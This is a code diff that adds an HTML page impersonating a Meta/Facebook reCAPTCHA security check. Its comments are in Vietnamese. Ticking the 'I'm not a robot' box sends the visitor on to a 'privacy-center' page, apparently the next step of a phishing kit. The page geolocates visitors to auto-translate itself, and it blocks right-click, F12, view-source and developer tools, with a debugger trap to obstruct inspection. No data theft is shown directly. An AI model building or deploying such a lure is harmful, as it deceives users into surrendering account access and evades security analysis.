@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Cấu hình Open Graph hiển thị ảnh trên Facebook -->
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Meta | Recaptcha" />
+    <meta property="og:description" content="Xác minh danh tính của bạn để tiếp tục." />
+    
+    <!-- Đã thay bằng link ảnh gốc online chuẩn chỉnh -->
+    <meta property="og:image" content="https://i.ibb.co/My8VDBxS/property.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <title>Meta | Recaptcha</title>
+    <link rel="shortcut icon" href="./public/images/favicon.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@3.4.1/dist/tailwind.min.css">
+    <link rel="stylesheet" href="./public/styles/checkbox.css">
+    <link rel="stylesheet" href="./public/styles/style.css">
+</head>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D87FF',
+                        secondary: '#212121'
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+
+<body class="bg-[#ffffff] flex flex-col items-center justify-center h-[100vh] w-full">
+
+    <div class="font-sans text-sm text-gray-800 w-full h-full flex flex-col justify-center p-4 md:p-0 md:w-[300px]">
+
+        <div class="w-full">
+            <img src="./public/images/logo-meta.svg" alt="Meta" class="w-[64px]">
+        </div>
+
+        <div class="flex items-center justify-start bg-cover bg-center py-5 w-full">
+            <div class="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
+                <div class="flex flex-row items-center justify-start ml-4">
+                    <div class="relative w-[30px] h-[30px] flex items-center justify-center">
+                        <label class="checkbox flex items-center justify-center cursor-pointer">
+                            <input type="checkbox" id="robotCheckbox">
+                            <svg viewBox="0 0 21 21">
+                                <path d="M5,10.75 L8.5,14.25 L19.4,2.3 C18.8333333,1.43333333 18.0333333,1 17,1 L4,1 C2.35,1 1,2.35 1,4 L1,17 C1,18.65 2.35,20 4,20 L17,20 C18.65,20 20,18.65 20,17 L20,7.99769186"></path>
+                            </svg>
+                        </label>
+                    </div>
+                    <label for="robotCheckbox" class="cursor-pointer text-sm text-gray-500 font-semibold mr-4 ml-1">
+                        I'm not a robot
+                    </label>
+                </div>
+                <div class="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
+                    <img src="./public/images/recaptcha.png" alt="reCAPTCHA" class="w-[40px] h-[40px] mt-[.5rem]">
+                    <span class="text-[10px] font-bold">reCAPTCHA</span>
+                    <div class="text-[8px]">Privacy - Terms</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="text-gray-700 text-[13px] leading-[1.3]">
+            <p class="font-normal">
+                This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our
+                Products.
+            </p>
+            <p class="font-normal mt-4">
+                We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA
+                Enterprise is subject to Google’s Privacy Policy and Terms of Use.
+            </p>
+            <p class="font-normal mt-4">
+                reCAPTCHA Enterprise collects hardware and software information, such as device and application data,
+                and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security
+                purposes. This information is not used by Google for personalized advertising.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const checkbox = document.getElementById('robotCheckbox');
+        checkbox.addEventListener('change', () => {
+            if (checkbox.checked) {
+                setTimeout(() => {
+                    window.location.href = './privacy-center';
+                }, 600);
+            }
+        });
+    </script>
+
+    <script>
+    const langMap = {
+        AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt",
+        AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
+        BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es",
+        BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
+        CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW",
+        HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
+        HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es",
+        EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
+        FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en",
+        GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
+        IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en",
+        IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
+        KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo",
+        LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
+        MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn",
+        ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
+        NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar",
+        PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
+        PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro",
+        RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
+        SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv",
+        CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw",
+        TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar",
+        GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
+        VN:"vi", YE:"ar", ZM:"en", ZW:"en"
+    };
+        async function getCountryCode() {
+            try {
+                const cache = sessionStorage.getItem("country_code");
+                if (cache) return cache;
+
+                const res = await fetch("https://get.geojs.io/v1/ip/geo.json", {
+                    cache: "force-cache"
+                });
+
+                const data = await res.json();
+                const code = data.country_code || "US";
+                sessionStorage.setItem("country_code", code);
+                return code;
+            } catch {
+                return "US";
+            }
+        }
+
+        function setCookie(name, value, days = 1) {
+            const d = new Date();
+            d.setTime(d.getTime() + days * 86400000);
+            document.cookie = `${name}=${value};expires=${d.toUTCString()};path=/;SameSite=None;Secure`;
+        }
+
+        async function googleTranslateElementInit() {
+            let savedLang = sessionStorage.getItem("translatedLang");
+            if (!savedLang) {
+                const country = await getCountryCode();
+                savedLang = langMap[country] || "en";
+            }
+
+            if (savedLang === "en") return;
+
+            sessionStorage.setItem("translatedLang", savedLang);
+            setCookie("googtrans", `/en/${savedLang}`);
+
+            new google.translate.TranslateElement({
+                pageLanguage: "en",
+                autoDisplay: false
+            }, "google_translate_element");
+
+            const timer = setInterval(() => {
+                const select = document.querySelector(".goog-te-combo");
+                if (select) {
+                    select.value = savedLang;
+                    select.dispatchEvent(new Event("change"));
+                    clearInterval(timer);
+                }
+            }, 10);
+        }
+
+        window.addEventListener("pageshow", () => {
+            const lang = sessionStorage.getItem("translatedLang");
+            if (lang) {
+                setCookie("googtrans", `/en/${lang}`);
+            }
+        });
+    </script>
+    <script async src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <script>
+        document.addEventListener('contextmenu', function (e) {
+            e.preventDefault();
+        }, false);
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'F12' || e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && e.shiftKey && (
+                e.key.toLowerCase() === 'i' ||
+                e.key.toLowerCase() === 'j' ||
+                e.key.toLowerCase() === 'c'
+            )) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && (e.key.toLowerCase() === 'u')) {
+                e.preventDefault();
+                return false;
+            }
+
+            if (e.ctrlKey && (e.key.toLowerCase() === 's')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        setInterval(() => {
+            const devtoolsOpen =
+                (window.outerWidth - window.innerWidth > 160) ||
+                (window.outerHeight - window.innerHeight > 160);
+
+            if (devtoolsOpen) {
+                debugger;
+            }
+        }, 500);
+
+        document.addEventListener('keyup', e => {
+            if (e.key === 'F12') e.preventDefault();
+        });
+    </script>
+
+</body>
+</html>
